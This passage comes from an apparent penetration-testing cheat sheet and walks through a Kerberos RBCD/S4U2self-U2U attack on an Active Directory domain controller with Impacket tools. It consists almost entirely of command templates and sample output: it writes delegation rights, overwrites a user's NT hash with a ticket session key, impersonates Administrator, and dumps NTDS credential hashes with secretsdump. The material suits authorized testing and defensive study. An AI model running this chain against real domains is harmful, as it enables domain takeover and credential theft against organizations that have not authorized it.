```console {class="sample-code"}
$ impacket-rbcd 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -delegate-from 'apple.seed' -delegate-to 'DC$' -action 'write'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] apple.seed can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     apple.seed   (S-1-5-21-3542429192-2036945976-3483670807-11601)
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-rbcd '<DOMAIN>/<USER>' -k -dc-ip <DC_IP> -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
```

```console {class="sample-code"}
$ impacket-rbcd 'example.com/apple.seed' -k -dc-ip 10.10.11.10 -delegate-from 'apple.seed' -delegate-to 'DC$' -action 'write'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] apple.seed can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     apple.seed   (S-1-5-21-3542429192-2036945976-3483670807-11601)
```

#### 2. Generate NTLM Hash

```console
iconv -f ASCII -t UTF-16LE <(printf '<PASSWORD>') | openssl dgst -md4
```

```console {class="sample-code"}
$ iconv -f ASCII -t UTF-16LE <(printf 'Password123!') | openssl dgst -md4
MD4(stdin)= 2B576ACBE6BCFDA7294D6BD18041B8FE
```

#### 3. Request a Ticket

```console
# NTLM
impacket-getTGT '<DOMAIN>/<USER>@<TARGET>' -hashes ':<HASH>'
```

```console {class="sample-code"}
$ impacket-getTGT 'example.com/apple.seed@DC.example.com' -hashes ':2B576ACBE6BCFDA7294D6BD18041B8FE'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in apple.seed@DC.example.com.ccache
```

#### 4. Get Session Key

```console
# Pass-the-ticket
export KRB5CCNAME='<CCACHE>'
```

```console {class="sample-code"}
$ export KRB5CCNAME='apple.seed@DC.example.com.ccache'
```

```console
# Get tickey session key
impacket-describeTicket '<CCACHE>' | grep 'Ticket Session Key' 
```

```console {class="sample-code"}
$ impacket-describeTicket apple.seed@DC.example.com.ccache | grep 'Ticket Session Key' 
[*] Ticket Session Key            : 49e0cd8abe883d869f5af9ad8556fb29
```

#### 5. Update Target User NT Hash

```console {class="password"}
# Password
impacket-changepasswd '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -dc-ip <DC_IP> -newhashes :<SESSION_KEY>
```

```console {class="sample-code"}
$ impacket-changepasswd 'example.com/apple.seed:Password123!@dc.example.com' -dc-ip 10.10.11.10 -newhashes :49e0cd8abe883d869f5af9ad8556fb29
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of example.com\apple.seed
[*] Connecting to DCE/RPC as example.com\apple.seed
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

```console {class="ntlm"}
# NTLM
impacket-changepasswd '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> -dc-ip <DC_IP> -newhashes :<SESSION_KEY>
```

```console {class="sample-code"}
$ impacket-changepasswd 'example.com/apple.seed@dc.example.com' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -newhashes :49e0cd8abe883d869f5af9ad8556fb29
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of example.com\apple.seed
[*] Connecting to DCE/RPC as example.com\apple.seed
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-changepasswd '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -k -dc-ip <DC_IP> -newhashes :<SESSION_KEY>
```

```console {class="sample-code"}
$ impacket-changepasswd 'example.com/apple.seed:Password123!@dc.example.com' -k -dc-ip 10.10.11.10 -newhashes :49e0cd8abe883d869f5af9ad8556fb29
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of example.com\apple.seed
[*] Connecting to DCE/RPC as example.com\apple.seed
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-changepasswd '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> -k -dc-ip <DC_IP> -newhashes :<SESSION_KEY>
```

```console {class="sample-code"}
$ impacket-changepasswd 'example.com/apple.seed@dc.example.com' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -newhashes :49e0cd8abe883d869f5af9ad8556fb29
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of example.com\apple.seed
[*] Connecting to DCE/RPC as example.com\apple.seed
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-changepasswd '<DOMAIN>/<USER>@<TARGET>' -k -dc-ip <DC_IP> -newhashes :<SESSION_KEY>
```

```console {class="sample-code"}
$ impacket-changepasswd 'example.com/apple.seed@dc.example.com' -k -dc-ip 10.10.11.10 -newhashes :49e0cd8abe883d869f5af9ad8556fb29
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of example.com\apple.seed
[*] Connecting to DCE/RPC as example.com\apple.seed
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

#### 6. Get a Service Ticket

```console {class="password"}
# Password
sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER> -u2u
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/apple.seed:Password123!' -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator -u2u
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.example.com@example.com.ccache
```

```console {class="ntlm"}
# NTLM
sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER> -u2u
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator -u2u
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.example.com@example.com.ccache
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER> -u2u
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/apple.seed:Password123!' -k -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator -u2u
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.example.com@example.com.ccache
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER> -u2u
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator -u2u
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.example.com@example.com.ccache
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<USER>' -k -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER> -u2u
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/apple.seed' -k -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator -u2u
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.example.com@example.com.ccache
```

#### 7. Secrets Dump

```console
# Pass-the-ticket
export KRB5CCNAME='<CCACHE_2>'
```

```console {class="sample-code"}
$ export KRB5CCNAME='Administrator@cifs_DC.example.com@PHANTOM.VL.ccache'
```

```console
# Ticket-based Kerberos
impacket-secretsdump <TARGET_USER>@<TARGET> -k -no-pass
```

```console {class="sample-code"}
$ impacket-secretsdump administrator@dc.example.com -k -no-pass -just-dc-user Administrator
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}

<br>